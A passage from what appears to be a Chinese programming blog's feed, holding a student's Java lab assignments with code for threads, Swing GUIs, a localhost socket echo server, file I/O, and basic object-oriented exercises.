    <content type="text"><![CDATA[java第四次实验作业。 一、 编写一个多线程程序，在其中实现两个定时线程，一个线程每隔1秒显示一次秒数，另一个每隔3秒显示一次字母(a,b,…)。 package hw6; public class nine_2 extends Thread { String str; public nine_2(String str) { this.str=str; } public void run() { int i=0; if(this.str.equals(&quot;a&quot;)) { while(true) { i++; System.out.println(i); try { sleep(1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } else { int j=0; while(true) { System.out.println((char)(97+j%26)); j++; try { sleep(3000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } } public static void main(String[] args) { nine_2 thread1=new nine_2(&quot;a&quot;); nine_2 thread2=new nine_2(&quot;b&quot;); thread1.start(); thread2.start(); } } laPBsH.png 二、编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”，界面如下图所示。 package hw6; import java.awt.BorderLayout; import java.awt.EventQueue; import java.awt.Point; import javax.swing.JFrame; import javax.swing.JPanel; import javax.swing.border.EmptyBorder; import hw6.youyi.mythread; import javax.swing.JLabel; import javax.swing.JButton; import java.awt.event.ActionListener; import java.awt.event.ActionEvent; public class zuoyouyi extends JFrame { private JPanel contentPane; private JLabel lblNewLabel; private JLabel lblNewLabel_1; /** * Launch the application. */ public static void main(String[] args) { EventQueue.invokeLater(new Runnable() { public void run() { try { zuoyouyi frame = new zuoyouyi(); frame.setVisible(true); } catch (Exception e) { e.printStackTrace(); } } }); } class mythread extends Thread { String str; public mythread(String str) { this.str=str; } public void run() { if(this.str.equals(&quot;right&quot;)) { Point p=lblNewLabel.getLocation(); int i=1; while(i&lt;=10) { p.x=p.x+10; lblNewLabel.setLocation(p); try { sleep(1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } i++; } } if(this.str.equals(&quot;left&quot;)) { Point p=lblNewLabel_1.getLocation(); int i=1; while(i&lt;=10) { p.x=p.x-10; lblNewLabel_1.setLocation(p); try { sleep(1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } i++; } } } } /** * Create the frame. */ public zuoyouyi() { setTitle(&quot;\u5DE6\u53F3\u6587\u5B57\u79FB\u52A8&quot;); setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); setBounds(100, 100, 450, 300); contentPane = new JPanel(); contentPane.setBorder(new EmptyBorder(5, 5, 5, 5)); setContentPane(contentPane); contentPane.setLayout(null); lblNewLabel = new JLabel(&quot;\u5411\u53F3\u79FB\u6807\u7B7E&quot;); lblNewLabel.setBounds(42, 43, 76, 16); contentPane.add(lblNewLabel); lblNewLabel_1 = new JLabel(&quot;\u5411\u5DE6\u79FB\u6807\u7B7E&quot;); lblNewLabel_1.setBounds(302, 99, 76, 16); contentPane.add(lblNewLabel_1); JButton btnNewButton = new JButton(&quot;\u5411\u53F3\u79FB&quot;); btnNewButton.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { mythread thread1=new mythread(&quot;right&quot;); thread1.start(); } }); btnNewButton.setBounds(69, 180, 103, 25); contentPane.add(btnNewButton); JButton btnNewButton_1 = new JButton(&quot;\u5411\u5DE6\u79FB&quot;); btnNewButton_1.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { mythread thread2=new mythread(&quot;left&quot;); thread2.start(); } }); btnNewButton_1.setBounds(247, 180, 103, 25); contentPane.add(btnNewButton_1); } } laP4yQ.png 三、小球向右下角移动。 package hw6; import java.awt.BorderLayout; import java.awt.EventQueue; import java.awt.Graphics; import java.awt.event.MouseAdapter; import java.awt.event.MouseEvent; import javax.swing.JFrame; import javax.swing.JPanel; import javax.swing.border.EmptyBorder; public class lizi extends JFrame { private JPanel contentPane; int i=0; /** * Launch the application. */ public static void main(String[] args) { EventQueue.invokeLater(new Runnable() { public void run() { try { lizi frame = new lizi(); frame.setVisible(true); } catch (Exception e) { e.printStackTrace(); } } }); } class mythread extends Thread{ public void run() { for( i=1;i&lt;=5;i++) { repaint(); try { sleep(1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } } public void paint(Graphics g) { super.paint(g); g.fillOval(50+i*10, 50+i*10, 100, 100); } /** * Create the frame. */ public lizi() { setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); setBounds(100, 100, 450, 300); contentPane = new JPanel(); contentPane.setBorder(new EmptyBorder(5, 5, 5, 5)); contentPane.setLayout(new BorderLayout(0, 0)); setContentPane(contentPane); this.addMouseListener(new MouseAdapter() { public void mouseClicked(MouseEvent e) { mythread thread1=new mythread(); thread1.start(); } }); } } laiiY6.png 四、编程读取中国教育网主页html文档( URL：http://www.edu.cn )，显示该文档内容，并判断其中是否有字符串“中国教育和科研计算机网网络中心”。 package hw6; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; import java.io.UnsupportedEncodingException; import java.net.MalformedURLException; import java.net.URL; public class shiyi_1 { public static void main(String[] args) { boolean flag=false; try { URL url=new URL(&quot;http://www.edu.cn&quot;); InputStream is=null; try { is = url.openStream(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } InputStreamReader isr=null; try { isr = new InputStreamReader(is,&quot;utf-8&quot;); } catch (UnsupportedEncodingException e) { // TODO Auto-generated catch block e.printStackTrace(); } BufferedReader br = new BufferedReader(isr); try { String data=br.readLine(); while(data != null){ System.out.println(data); if(data.contains(&quot;中国教育和科研计算机网网络中心&quot;)) { flag=true; } data = br.readLine(); } br.close(); isr.close(); is.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } catch (MalformedURLException e) { // TODO Auto-generated catch block e.printStackTrace(); } if(flag==true) { System.out.println(&quot;含有&quot;); } else { System.out.println(&quot;不含有&quot;); } } } laF4Vs.png 五、编写一个基于TCP的Socket程序，服务器向客户端发送一个字符串：”Socket你好!”，客户端将接收到的字符串输出到屏幕。在一台PC上测试该程序。 编写一个基于TCP的Socket程序，服务器向客户端发送一个字符串：”Socket你好!”，客户端将接收到的字符串输出到屏幕。在两台PC之间测试该程序。（本题上机时两人一组，一个作为服务方，另一个作为客户方，然后两人之间进行对话） 编写一个Socket网络通讯应用程序，实现如下功能： 1）客户端能够发任意的信息给服务器端； 2）服务器端将收到的客户端信息返还给客户端。 把3个合在一起 服务器端： package hw6; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintStream; import java.net.ServerSocket; import java.net.Socket; public class sever { public static void main(String[] args) { try { // 构造服务器ServerSocket对象 ServerSocket ss = new ServerSocket(30102); System.out.println(&quot;服务器准备就绪！&quot;); while(true){ Socket s = ss.accept(); // 线程 new ServerThread(s).start(); } } catch (IOException e) { e.printStackTrace(); } } } /** * 服务器端与客户端会话的线程 */ class ServerThread extends Thread { private Socket s = null; private BufferedReader read = null; private PrintStream print = null; public ServerThread(Socket s) { this.s = s; try { read = new BufferedReader(new InputStreamReader(s.getInputStream())); print = new PrintStream(s.getOutputStream()); } catch (IOException e) { e.printStackTrace(); } } /** * 线程的运行run方法 */ public void run() { try { String message = null; while (!(message = read.readLine()).equals(&quot;exit&quot;)){ System.out.println(&quot;client发送：&quot;+message); print.println(&quot;Socket你好!&quot; + message); } } catch (IOException e) { } finally { try { if(!s.isClosed()){ s.close(); } } catch (IOException e1) { e1.printStackTrace(); } } } } 客户端： package hw6; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintStream; import java.net.Socket; import java.net.UnknownHostException; import java.util.Scanner; public class client { public static void main(String[] args) { try { // 构造与服务器通讯的Socket对象 Socket s = new Socket(&quot;127.0.0.1&quot;, 30102); // 启动一个线程与服务器通讯 new LinkThread(s).start(); } catch (UnknownHostException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } } /** * 与服务器通讯的线程 */ class LinkThread extends Thread { private Socket s = null; private PrintStream out = null; private BufferedReader in = null; private Scanner scanner = null; public LinkThread(Socket s) { this.s = s; try { out = new PrintStream(s.getOutputStream()); in = new BufferedReader(new InputStreamReader(s.getInputStream())); } catch (UnknownHostException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } /** * 线程的运行run方法 */ public void run() { scanner = new Scanner(System.in); System.out.println(&quot;提示：如果要结束本次会话，请输入“exit”指令！&quot;); try { while(true){ System.out.print(&quot;请输入：&quot;); String message = scanner.nextLine(); out.println(message); out.flush(); String str = in.readLine(); if(str != null){ System.out.println(str); }else{ System.out.println(&quot;本次会话结束！&quot;); return; } } } catch (IOException e) { e.printStackTrace(); } finally { try { if(!s.isClosed()){ s.close(); } } catch (IOException e1) { e1.printStackTrace(); } } } } lakCRK.png 🚩推荐阅读java第三次实验作业java第二次实验作业java继承实现多态的例子java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java第三次实验作业]]></title>
    <url>%2F2020%2F01%2F03%2Fjava-3%2F</url>
    <content type="text"><![CDATA[Java第三次实验作业。 一、开发一个加、减、乘、除四则运算器。用户界面如下图： laCkAx.png package hw5; import java.awt.*; import java.awt.event.ActionListener; import javax.swing.*; import javax.swing.border.EmptyBorder; import javafx.event.ActionEvent; public class jsq extends JFrame { private JPanel contentPane; private JTextField textField; private JTextField textField_1; private JTextField textField_2; /** * Launch the application. */ public static void main(String[] args) { EventQueue.invokeLater(new Runnable() { public void run() { try { jsq frame = new jsq(); frame.setVisible(true); } catch (Exception e) { e.printStackTrace(); } } }); } /** * Create the frame. */ public jsq() { setFont(new Font(&quot;幼圆&quot;, Font.BOLD, 20)); setForeground(new Color(153, 50, 204)); setTitle(&quot;\u8BA1\u7B97\u5668&quot;); setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); setBounds(100, 100, 450, 300); contentPane = new JPanel(); contentPane.setBorder(new EmptyBorder(5, 5, 5, 5)); setContentPane(contentPane); contentPane.setLayout(null); textField = new JTextField(); textField.setBounds(0, 0, 432, 56); contentPane.add(textField); textField.setColumns(10); textField_1 = new JTextField(); textField_1.setBounds(0, 67, 432, 56); contentPane.add(textField_1); textField_1.setColumns(10); JButton btnNewButton = new JButton(&quot;+&quot;); btnNewButton.setFont(new Font(&quot;幼圆&quot;, Font.BOLD, 16)); btnNewButton.setForeground(new Color(50, 205, 50)); btnNewButton.addActionListener(new ActionListener() { @Override public void actionPerformed(java.awt.event.ActionEvent e) { // TODO Auto-generated method stub double x = Double.parseDouble(textField.getText()); double y = Double.parseDouble(textField_1.getText()); double z = x+y; if(z - (int)z &lt;= 0.00001) textField_2.setText(Integer.toString((int)z)); else textField_2.setText(Double.toString(z)); } }); btnNewButton.setBounds(0, 122, 103, 54); contentPane.add(btnNewButton); JButton btnNewButton_1 = new JButton(&quot;-&quot;); btnNewButton_1.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { } @Override public void actionPerformed(java.awt.event.ActionEvent e) { // TODO Auto-generated method stub double x = Double.parseDouble(textField.getText()); double y = Double.parseDouble(textField_1.getText()); double z = x-y; if(z - (int)z &lt;= 0.00001) textField_2.setText(Integer.toString((int)z)); else textField_2.setText(Double.toString(z)); } }); btnNewButton_1.setFont(new Font(&quot;幼圆&quot;, Font.BOLD, 20)); btnNewButton_1.setForeground(new Color(255, 69, 0)); btnNewButton_1.setBounds(115, 122, 103, 54); contentPane.add(btnNewButton_1); JButton btnNewButton_2 = new JButton(&quot;*&quot;); btnNewButton_2.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { } @Override public void actionPerformed(java.awt.event.ActionEvent e) { // TODO Auto-generated method stub double x = Double.parseDouble(textField.getText()); double y = Double.parseDouble(textField_1.getText()); double z = x*y; if(z - (int)z &lt;= 0.00001) textField_2.setText(Integer.toString((int)z)); else textField_2.setText(Double.toString(z)); } }); btnNewButton_2.setFont(new Font(&quot;幼圆&quot;, Font.BOLD, 20)); btnNewButton_2.setForeground(new Color(255, 215, 0)); btnNewButton_2.setBounds(218, 122, 103, 54); contentPane.add(btnNewButton_2); JButton btnNewButton_3 = new JButton(&quot;/&quot;); btnNewButton_3.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { } @Override public void actionPerformed(java.awt.event.ActionEvent e) { // TODO Auto-generated method stub double x = Double.parseDouble(textField.getText()); double y = Double.parseDouble(textField_1.getText()); double z = x/y; if(z - (int)z &lt;= 0.00001) textField_2.setText(Integer.toString((int)z)); else textField_2.setText(Double.toString(z)); } }); btnNewButton_3.setFont(new Font(&quot;幼圆&quot;, Font.BOLD, 20)); btnNewButton_3.setForeground(new Color(0, 191, 255)); btnNewButton_3.setBounds(329, 122, 103, 54); contentPane.add(btnNewButton_3); textField_2 = new JTextField(); textField_2.setBounds(0, 187, 442, 58); contentPane.add(textField_2); textField_2.setColumns(10); } } laCr5V.png 二、编写一个程序，实现文件内容拷贝，具体过程如下： 1) 建一文件myfile1.txt，写入内容“I am a student.”； 2) 打开文件myfile1.txt，读出内容放入字符数组中； 3) 再建一文件myfile2.txt，将字符数组中内容写入； 4) 打开文件myfile2.txt，读出内容输出到屏幕。 package hw5; import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.File; import java.io.FileNotFoundException; import java.io.FileReader; import java.io.FileWriter; import java.io.IOException; public class shi_1 { public static void main(String[] args) { String str=null; String str1=null; String name_1=&quot;F:/myfile1.txt&quot;; String name_2=&quot;F:/myfile2.txt&quot;; FileWriter w1=null; try { w1=new FileWriter(name_1,true); w1.write(&quot;I am a student.&quot;); w1.close(); System.out.println(&quot;myfile1.txt写入成功&quot;); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } FileReader r1=null; BufferedReader br1=null; try { r1=new FileReader(name_1); br1=new BufferedReader(r1); try { str=br1.readLine(); //System.out.println(str); br1.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } FileWriter w2=null; BufferedWriter bw2=null; try { w2=new FileWriter(name_2,true); bw2=new BufferedWriter(w2); bw2.write(str); bw2.flush(); w2.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } FileReader r2=null; BufferedReader br2=null; try { r2=new FileReader(name_2); br2=new BufferedReader(r2); try { str1=br2.readLine(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } System.out.println(str1); } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } laCI56.png 三、 编写一个窗口程序，界面如下图，窗口FlowLayout布局，宽240，高200；文本框宽10，文本区大小为5行25列。 要求实现下列功能： 1) 点击“打开文件”，则弹出打开文件对话框，可从(D盘根目录)中选择一个字符文件，然后将选择的文件名称显示在文本框中； 2) 点击“显示文件内容”，则读出打开的文件的内容，并将读取的内容显示在文本区中； package hw5; import java.awt.BorderLayout; import java.awt.EventQueue; import javax.swing.JFrame; import javax.swing.JLabel; import javax.swing.JPanel; import javax.swing.border.EmptyBorder; import javax.swing.JButton; import javax.swing.JTextField; import javax.swing.JTextArea; import javax.swing.JList; import javax.swing.JComboBox; import javax.swing.JFileChooser; import java.awt.Panel; import java.awt.ScrollPane; import java.awt.event.ActionListener; import java.io.BufferedReader; import java.io.File; import java.io.FileNotFoundException; import java.io.FileReader; import java.io.IOException; import java.awt.event.ActionEvent; public class wenjian extends JFrame { private JPanel contentPane; private JTextField textField; /** * Launch the application. */ public static void main(String[] args) { EventQueue.invokeLater(new Runnable() { public void run() { try { wenjian frame = new wenjian(); frame.setVisible(true); } catch (Exception e) { e.printStackTrace(); } } }); } /** * Create the frame. */ public wenjian() { setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); setBounds(100, 100, 450, 300); contentPane = new JPanel(); contentPane.setBorder(new EmptyBorder(5, 5, 5, 5)); setContentPane(contentPane); contentPane.setLayout(null); JButton btnNewButton = new JButton(&quot;\u6253\u5F00\u6587\u4EF6&quot;); btnNewButton.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent arg0) { JFileChooser chooser = new JFileChooser(); chooser.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES); chooser.showDialog(new JLabel(), &quot;选择&quot;); File file = chooser.getSelectedFile(); textField.setText(file.getAbsoluteFile().toString()); } }); btnNewButton.setBounds(23, 11, 129, 42); contentPane.add(btnNewButton); textField = new JTextField(); textField.setBounds(199, 21, 198, 22); contentPane.add(textField); textField.setColumns(10); JTextArea textArea = new JTextArea(); textArea.setBounds(33, 68, 346, 112); contentPane.add(textArea); JButton btnNewButton_1 = new JButton(&quot;\u663E\u793A\u6587\u4EF6\u5185\u5BB9&quot;); btnNewButton_1.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { try { FileReader fr=new FileReader(textField.getText()); BufferedReader br=new BufferedReader(fr); try { textArea.setText(br.readLine()); } catch (IOException e1) { // TODO Auto-generated catch block e1.printStackTrace(); } } catch (FileNotFoundException e1) { // TODO Auto-generated catch block e1.printStackTrace(); } } }); btnNewButton_1.setBounds(124, 192, 167, 41); contentPane.add(btnNewButton_1); } } laPniV.png 🚩推荐阅读java第四次实验作业java第二次实验作业java继承实现多态的例子java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java第二次实验作业]]></title>
    <url>%2F2019%2F12%2F30%2Fjava-2%2F</url>
    <content type="text"><![CDATA[Java第二次实验作业。 一、编写一个程序，其中设计一个矩阵类Matrix Matrix类： package hw4; public class Matrix { private int m,n; protected int[][]ma; public Matrix(int m,int n) { this.m = m; this.n = n; } public void setMa(int[][]ma) { this.ma = ma; } public Matrix cheng(Matrix a) { if(n != a.m) return null; Matrix ans= new Matrix(m,a.n); int ansm = m,ansn = a.n; int[][]ansa = new int[ansm][ansn]; for(int i = 0; i &lt; ansm; i++) { for(int j = 0; j &lt; ansn; j++) { for(int k = 0; k &lt; n; k++) { ansa[i][j] += ma[i][k]*a.ma[k][j]; } } } ans.ma = ansa; return ans; } public void print() { for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; n; j++) { System.out.print(ma[i][j]+&quot; &quot;); } System.out.println(); } } } Main类： package hw4; import java.util.*; public class main_matrix { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(&quot;请输入矩阵A的行列数：&quot;); int am = scanner.nextInt(); int an = scanner.nextInt(); System.out.println(&quot;请输入矩阵A：&quot;); Matrix matrixA = new Matrix(am, an); int[][]ma = new int[am][an]; for(int i = 0; i &lt; am; i++) { for(int j = 0; j &lt; an; j++) { ma[i][j] = scanner.nextInt(); } } matrixA.setMa(ma); System.out.println(&quot;请输入矩阵B的行列数：&quot;); int bm = scanner.nextInt(); int bn = scanner.nextInt(); System.out.println(&quot;请输入矩阵B：&quot;); Matrix matrixB = new Matrix(bm, bn); int[][]mb = new int[bm][bn]; for(int i = 0; i &lt; bm; i++) { for(int j = 0; j &lt; bn; j++) { mb[i][j] = scanner.nextInt(); } } matrixB.setMa(mb); //计算矩阵A乘矩阵B并打印结果 System.out.println(&quot;A*B的结果为：&quot;); matrixA.cheng(matrixB).print(); scanner.close(); } } lUxlMn.png 二、设计一个程序，其中含有一个接口Shape(形状)，其中有求形状的面积的方法area()。再定义三个实现接口的类：三角型类、矩形类和圆类。在主方法中创建Shape类型的一维数组，它有三个元素，放置三个对象，分别表示三角形、矩形和圆，然后利用循环输出三个图形的面积。 Shape接口： package hw4; public interface shape { double area(); } Circle类： package hw4; public class circle implements shape { final float pi=3.14f; float r; circle() { } circle(float r) { this.r=r; } public double area() { return pi*r*r; } } Rectangle类： package hw4; public class rectangle implements shape{ float w; float h; rectangle() { } rectangle(float w,float h) { this.w=w; this.h=h; } public double area() { return w*h; } } Square类： package hw4; import java.util.*; public class square implements shape{ float a,b,c; square() { } square(float a,float b,float c) { this.a=a; this.b=b; this.c=c; } public double area() { float p=(a+b+c)/2; return Math.sqrt(p*(p-a)*(p-b)*(p-c)); } } 主类： package hw4; import java.util.*; public class main_shape { public static void main(String[] args) { Scanner s=new Scanner(System.in); shape shape[]=new shape[3]; int i; for(i=0;i&lt;3;i++) { System.out.println(&quot;请选择输入的图形：1、圆形，2、矩形，3、三角形：&quot;); int x=s.nextInt(); if(x==1) { System.out.println(&quot;请输入圆形的半径：&quot;); shape[i]=new circle(s.nextFloat()); System.out.println(&quot;面积是：&quot;+shape[i].area()); } else if(x==2) { System.out.println(&quot;请输入矩形宽和高：&quot;); shape[i]=new rectangle(s.nextFloat(),s.nextFloat()); System.out.println(&quot;面积是：&quot;+shape[i].area()); } else if(x==3) { System.out.println(&quot;请输入三角形a,b,c:&quot;); shape[i]=new square(s.nextFloat(),s.nextFloat(),s.nextFloat()); System.out.println(&quot;面积是：&quot;+shape[i].area()); } else { System.out.println(&quot;非法输入，程序退出&quot;); break; } } } } lUxjQs.png 三、编一程序，在其中定义一个代表篮球队的类，它有放置队员姓名的向量并放入队员的姓名，再写两个方法： 1）在向量中查找某人。若找到则输出“找到此人！”，否则输出“查无此人！”。 2）删除队员。先查找该人，若找到则删除，否则输出“无此队员！”。 package hw4; public class basketball { String dy[]=new String[10]; basketball() { int i; for(i=0;i&lt;10;i++) { dy[i]=null; } } public void insert(String name) { int i; for(i=0;i&lt;10;i++) { if(dy[i]==null) { dy[i]=name; System.out.println(&quot;插入成功&quot;); break; } } } public void delete(String name) { int i; for(i=0;i&lt;10;i++) { if(dy[i].equals(name)) { dy[i]=null; System.out.println(&quot;删除成功&quot;); break; } } if(i==10) { System.out.println(&quot;查无此人&quot;); } } public void show() { int i; for(i=0;i&lt;10;i++) { System.out.print(dy[i]+&quot;,&quot;); } } } 主类： package hw4; import java.util.*; public class main_basket { public static void main(String[] args) { Scanner s=new Scanner(System.in); basketball b=new basketball(); while(true) { System.out.println(&quot;输入1插入，2删除，其它退出&quot;); int x=s.nextInt(); if(x==1) { b.insert(s.nextLine()); b.show(); } else if(x==2) { b.delete(s.nextLine()); b.show(); } else { b.show(); System.out.println(&quot;程序已退出&quot;); break; } } } } lUzEl9.png 四、设计一个继承Vector类的队列类Queue，实现队列的先进先出功能, 类中含有两个方法：入队inqueue和出队outqueue(要充分利用Vector类的方法)。在主方法中创建一个队列类对象，然后依次完成 “111” 入队、“222”入队、出队一元素(输出到屏幕)、“333”入队，最后出队所有元素并且输出到屏幕。 package hw4; import java.util.*; public class queue extends Vector{ public void inqueue(Object obj) { addElement(obj); } public Object outqueue() { Object b=firstElement(); removeElementAt(0); return b; } public static void main(String[] args) { queue q1=new queue(); q1.inqueue(&quot;111&quot;); q1.inqueue(&quot;222&quot;); Object bb=q1.outqueue(); System.out.println(bb); q1.inqueue(&quot;333&quot;); bb=q1.outqueue(); System.out.println(bb); bb=q1.outqueue(); System.out.println(bb); } } laSCnI.png 五、java.util包中有个类“Arrays”，它有个方法“sort(&lt;数组名&gt;)”，功能是将数组按升序排序。请编一程序，在其中创建一个数组，然后利用sort方法进行排序。 package hw2; import java.util.*; public class seven { public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(&quot;请输入10个数&quot;); int a[]=new int[10]; int i; for(i=0;i&lt;10;i++) { a[i]=s.nextInt(); } Arrays.sort(a); for(i=0;i&lt;10;i++) { System.out.print(a[i]+&quot;\t&quot;); } } laSMBq.png 六、编写一个让小朋友做十次加法的程序，要求程序中生成两个不大于50的随机正整数a和b，其中a由Math类的随机函数生成，b则利用机器当前时间的秒数和分数生成，在小朋友回答后要给出对错的判断。 package hw4; import java.time.LocalDateTime; import java.util.*; public class jisuanti { public static void main(String[] args) { int i=0; while(i&lt;10) { Scanner s=new Scanner(System.in); LocalDateTime time=LocalDateTime.now(); int a=(int)(Math.random()*50); int b=(time.getMinute()+time.getSecond())%50; System.out.println(a+&quot;+&quot;+b+&quot;=&quot;); if(s.nextInt()==(a+b)) { System.out.println(&quot;yes&quot;); } else { System.out.println(&quot;no&quot;); } } } } lapZa6.png 🚩推荐阅读java第四次实验作业java第三次实验作业java继承实现多态的例子java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java继承实现多态的例子]]></title>
    <url>%2F2019%2F11%2F29%2Fjava-fujia%2F</url>
    <content type="text"><![CDATA[利用继承实现多态。 写一个动物园程序，可以向里面添加动物，并显示是第几个该类型的动物，并统计动物园里共有多少动物。 animal类： package hw3; public class animal { static int sum=0; public animal() { } public void show() { System.out.println(&quot;动物园一共有&quot;+sum+&quot;只动物&quot;); } } dog类 package hw3; public class dog extends animal{ static int dog_sum=0; public dog() { } public void show() { super.sum++; dog_sum++; System.out.println(&quot;我是狗，是第&quot;+dog_sum+&quot;只狗&quot;); super.show(); } } cat类 package hw3; public class cat extends animal{ static int cat_sum=0; public cat() { } public void show() { super.sum++; cat_sum++; System.out.println(&quot;我是猫，是第&quot;+cat_sum+&quot;只猫&quot;); super.show(); } } pig类 package hw3; public class pig extends animal{ static int pig_sum=0; public pig() { } public void show() { super.sum++; pig_sum++; System.out.println(&quot;我是猪，是第&quot;+pig_sum+&quot;只猪&quot;); super.show(); } } 主类 package hw3; import java.util.*; public class main_animal { public static void show_interface(animal sc) { sc.show(); } public static void main(String[] args) { Scanner s=new Scanner(System.in); animal an=new animal(); while(true) { System.out.println(&quot;请输入添加的动物类型(dog,cat,pig)(输入exit退出程序)：&quot;); String m=s.nextLine(); if(m.equals(&quot;exit&quot;)) { System.out.println(&quot;程序已退出&quot;); break; } switch(m) { case(&quot;dog&quot;): { an=new dog(); show_interface(an); break; } case(&quot;cat&quot;): { an=new cat(); show_interface(an); break; } case(&quot;pig&quot;): { an=new pig(); show_interface(an); break; } default: { System.out.println(&quot;非法字符,重新输入&quot;); break; } } } } } 运行结果: QkAELR.png 🚩推荐阅读java第四次实验作业java第三次实验作业java第二次实验作业java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java实验三]]></title>
    <url>%2F2019%2F11%2F26%2Fjava-shiyan-3%2F</url>
    <content type="text"><![CDATA[Java实验三。 问题1、编一程序，求两个正整数m、n的最大公约数。要求程序中有两个方法，分别使用循环和递归求最大公约数，最后在主方法中分别调用这两个方法求解56与91的最大公约数。 package hw3; public class one { public int cyc(int x,int y) { while(x%y!=0) { int s=x%y; x=y; y=s; } return y; } public int rec(int x,int y) { if(x%y==0) return y; else return rec(y,x%y); } public static void main(String[] args) { one o=new one(); int m,n; m=56; n=91; System.out.println(o.cyc(m,n)); System.out.println(o.rec(m,n)); } } 问题2、编写一个完整的Java Application程序，其中设计一个复数类Complex，利用它验证两个复数 1+2i 和3+4i 相加产生一个新的复数 4+6i 。复数类Complex的设计必须满足如下要求：1）Complex 的属性有：realPart：int型，代表复数的实数部分；maginPart：int型，代表复数的虚数部分。2）Complex 的方法有：Complex()：构造方法，将复数的实部和虚部都置0；Complex(int r , int i )：构造方法，形参 r 为实部的初值，i为虚部的初值。3）Complex complexAdd(Complex a)：将当前复数对象与形参复数对象相加，最后的结果仍是一个复数对象，返回给此方法的调用者。4）String toString(): 把当前复数对象的实部、虚部组合成 a+bi 的字符串形式，其中a 和 b分别为实部和虚部的数据。 package hw3; public class complex { int rp,mp; public complex() { rp=mp=0; } public complex(int i,int j) { rp=i; mp=j; } public complex complexadd(complex a) { this.rp=this.rp+a.rp; this.mp=this.mp+a.mp; return this; } public String toString() { String s=rp+&quot;+&quot;+mp+&quot;i&quot;; return s; } public static void main(String[] args) { complex c1=new complex(2,3); complex c2=new complex(4,5); c1.complexadd(c2); System.out.println(c1.toString()); } } 问题3、编写一个包含圆类的程序，并为圆类设计几个构造方法和一般方法，在主方法中创建一个圆类对象并输出它的周长和面积。要求： 属性有3个：x,y,r，分别放置圆心坐标和半径； 构造方法有2个。一个是无参的，用于设置3个属性的值都为0；另一个有参的，用于设置3个属性的值，以确定一个具体的圆。 计算周长的方法：double zc()；计算面积的方法：double mj()。 package hw3; import java.util.*; public class yuan { double x,y,r; public yuan() { x=y=r=0.0; } public yuan(double x,double y,double r) { this.x=x; this.y=y; this.r=r; } public double zc() { return 2*Math.PI*this.r; } public double mj() { return Math.PI*Math.pow(this.r, 2); } } 问题4、编写一个程序，它含有一个圆类、圆柱类和主类。要求： 1）圆类参考上一题中的圆类； 2）圆柱类：继承圆类，并加入一个属性h(高)； 构造方法(给4个属性赋值)； 计算面积的方法(double mj())； 计算体积的方法(double tj())。 注意，要充分利用父类的方法。 3）主类：在主方法中创建圆和圆柱类的对象，然后计算并输出它们的面积及圆柱的体积。 yuanzhu类 package hw3; import java.util.*; public class yuanzhu extends yuan{ double h; public yuanzhu(double x,double y,double r,double h) { super(x,y,r); this.h=h; } public double mj() { return super.zc()*this.h+2*super.mj(); } public double tj() { return super.mj()*this.h; } } main类 package hw3; public class main_yz { public static void main(String[] args) { yuan yuan1=new yuan(2,3,2); yuanzhu yuanzhu1=new yuanzhu(4,5,6,2); System.out.println(&quot;圆的面积是：&quot;+yuan1.mj()); System.out.println(&quot;圆柱的面积是：&quot;+yuanzhu1.mj()); System.out.println(&quot;圆柱的体积是：&quot;+yuanzhu1.tj()); } } QScZwt.png 问题6、编写一个含有5个类的程序： 类Person: 属性：编号、姓名、性别； 构造方法：确定编号和姓名； 